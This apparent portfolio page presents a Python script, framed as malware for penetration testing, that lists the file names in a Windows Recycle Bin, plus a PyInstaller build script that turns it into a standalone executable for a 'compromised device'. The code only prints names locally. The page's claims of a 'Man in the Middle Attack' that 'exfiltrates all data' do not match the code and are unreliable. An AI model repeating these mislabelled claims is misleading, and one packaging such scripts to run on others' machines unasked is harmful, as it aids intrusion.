---
layout: default
---

## Digital Dumpster Diving Executable Malware | Python, Penetration testing

This Python script performs a dumpster diving ‘Man in the Middle Attack’ by exfiltrating all data from a Windows Recycle Bin, even if the compromised device does not have Python installed.

```python
import winshell
import os

def dumpster_diving():
    dumpster = winshell.recycle_bin()
    for item in dumpster:
        og_path=item.original_filename()
        trash_item=os.path.basename(og_path)
        print(trash_item)

if __name__ == "__main__":
    dumpster_diving()
```

```python
import PyInstaller.__main__ 
import os
import shutil

filename = "dumpsterdive.py"
exename = "dumpsterdive"
pwd = os.getcwd()
usbdir = os.path.join(pwd,"USB")

dist_path = os.path.join(pwd, "dist")
build_path = os.path.join(pwd, "build")
spec_path = os.path.join(pwd, exename + ".spec")

if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
    "dumpsterdive.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
])

# Clean up after Pyinstaller
shutil.move(os.path.join(dist_path,exename+'.exe'),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
if os.path.isfile(spec_path):
    os.remove(spec_path)
```


[back](./)
